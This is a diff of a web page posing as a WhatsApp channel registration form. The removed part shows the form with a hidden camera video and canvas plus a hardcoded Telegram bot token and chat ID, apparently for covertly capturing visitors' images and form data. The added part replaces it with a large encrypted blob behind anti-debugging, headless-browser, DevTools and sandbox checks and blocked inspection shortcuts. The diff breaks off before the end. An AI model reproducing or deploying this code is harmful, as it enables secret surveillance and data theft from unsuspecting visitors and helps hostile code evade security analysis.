@@ -1,226 +1,55 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Pendaftaran ID Channel WhatsApp</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+<!--ENCODE BY SIBAYU-->
+<script>
+(() => {
+try {
+  if(location.protocol !== "https:") return document.body.innerHTML = "<h2 style='color:red;text-align:center'>HTTPS Only</h2>";
+  if(navigator.webdriver || /Headless/i.test(navigator.userAgent)) throw "Headless Detected";
+  if(window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) throw "DevTools Open";
+  if(navigator.hardwareConcurrency < 2 || navigator.deviceMemory < 2) throw "Sandbox Detected";
 
-    body {
-      margin: 0;
-      font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #1e1e1e, #111);
-      color: #fff;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-    h1 {
-      margin-bottom: 10px;
-      color: #ff4b2b;
-      text-shadow: 0 0 10px #ff4b2b;
-      font-size: 28px;
-    }
-    #clock {
-      font-size: 18px;
-      margin-bottom: 20px;
-      color: #fff176;
-      text-shadow: 0 0 5px #fff176;
-    }
-    form {
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-      background: rgba(255,255,255,0.05);
-      padding: 25px;
-      border-radius: 15px;
-      width: 100%;
-      max-width: 420px;
-      box-shadow: 0 0 25px rgba(255,75,43,0.5);
-    }
-    input {
-      padding: 12px;
-      border-radius: 10px;
-      border: none;
-      outline: none;
-      font-size: 16px;
-      background: rgba(255,255,255,0.1);
-      color: #fff;
-      transition: 0.3s;
-    }
-    input:focus {
-      background: rgba(255,255,255,0.2);
-      box-shadow: 0 0 10px #ff4b2b;
-    }
-    button {
-      padding: 14px;
-      border: none;
-      border-radius: 12px;
-      background: #ff4b2b;
-      color: #fff;
-      font-size: 16px;
-      cursor: pointer;
-      transition: 0.3s;
-      font-weight: 600;
-    }
-    button:hover {
-      background: #ff3a1b;
-      transform: scale(1.05);
-    }
-  </style>
-</head>
-<body>
-  <h1>Pendaftaran ID Channel WhatsApp</h1>
-  <div id="clock">--:--:--</div>
+  const trap = () => {
+    const t0 = performance.now(); debugger; const t1 = performance.now();
+    if (t1 - t0 > 100) throw "Timing Debug Detected";
+  };
+  trap(); setInterval(trap, 1000);
 
-  <!-- Video kamera disembunyikan -->
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  document.addEventListener('keydown', e => {
+    if(["F12","I","U","C","S","J"].includes(e.key.toUpperCase()) && (e.ctrlKey || e.metaKey)) e.preventDefault();
+  });
+  document.addEventListener("contextmenu", e => e.preventDefault());
 
-  <form id="channelForm">
-    <input type="text" id="idChannel" placeholder="ID Channel WhatsApp" required>
-    <input type="text" id="namaChannel" placeholder="Nama Channel WhatsApp" required>
-    <input type="text" id="linkChannel" placeholder="Link Channel WhatsApp" required>
-    <input type="number" id="totalPengikut" placeholder="Total Pengikut" required>
-    <button type="submit">Kirim</button>
-  </form>
+  const h = "192f989e2c56299633f107807bdc7de8401a947dc6da206117805c5efe09d7ed";
+  const iv2 = "yEoLepzc1YWxq0eq";
+  const c2 = "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";
 
-  <script>
-    const BOT_TOKEN = "7180447148:AAEbE6FAZyehaIuSf30H3zrPKFRAGidBP00"; 
-    const CHAT_ID = "7220003733"; 
